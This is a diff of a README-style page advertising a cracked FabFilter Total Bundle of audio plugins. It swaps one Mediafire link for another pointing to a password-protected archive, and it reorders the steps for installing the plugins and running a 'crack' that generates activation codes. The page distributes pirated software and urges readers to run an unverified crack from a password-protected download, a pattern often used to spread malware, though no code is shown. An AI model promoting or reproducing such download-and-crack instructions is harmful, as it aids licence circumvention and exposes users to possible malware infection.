@@ -2,11 +2,11 @@
 ## Fabfilter Total Bundle crack. All the well-known VST plugins from FabFilter for your DAW. No license activation required; unlocks automatically upon installation. Includes the complete suite of main FabFilter VST plugins:
 Fabfilter Pro-Q 4, Pro-R 2, Saturn 2, Simplon, Timeless 3, Twin 3, Pro-C 2, Pro-DS, Pro-G, Pro-L 2, Pro-MB, Volcano 3
 
-<a href="https://www.mediafire.com/folder/icjb05cvb07mx/fabfilter"> Download here (password: fabfilter) </a>
+<a href="https://www.mediafire.com/file/qd9p7xcucdy6ozb/FabFilter+-+Total+Bundle+v2026.05.zip/file"> Download here (password: fabfilter) </a>
 
 ## Simple crack installation:
-1. First, open the crack from the folder: WIN --> Update --> Fabfilter Bundle Update 2026.5
-2. Without closing the crack, install the FabFilter software itself from the folder: WIN --> Setup --> Fabfilter Total Bundle 2026.5
+1. First, open the setup from the folder: WIN --> Setup --> Fabfilter Bundle 2026.5
+2. Open the crack IN --> Update --> Fabfilter Total Bundle Update 2026.5
 3. Locate the FabFilter plugins in your DAW (for example, in FL Studio, use the "Manage plugins" feature).
 4. Generate a code using the crack and paste it into the plugin.
 
